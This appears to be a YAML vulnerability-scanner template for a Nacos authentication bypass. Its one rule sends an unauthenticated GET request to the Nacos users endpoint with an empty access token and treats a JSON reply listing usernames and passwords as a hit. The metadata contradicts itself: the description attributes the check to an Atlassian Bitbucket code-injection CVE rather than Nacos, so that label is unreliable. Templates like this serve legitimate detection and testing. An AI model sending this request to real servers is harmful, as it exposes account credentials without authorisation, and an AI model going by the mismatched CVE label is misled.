expression: r0()
id: nacos-core-auth-enabled-bypass
info:
  author: yoyo
  description: "atlassian-bitbucket-\u4EE3\u7801\u6CE8\u5165-CVE-2022-36804"
  name: "Nacos core.auth.enabled \u6743\u9650\u7ED5\u8FC7"
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"username":')
      && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
    request:
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken=
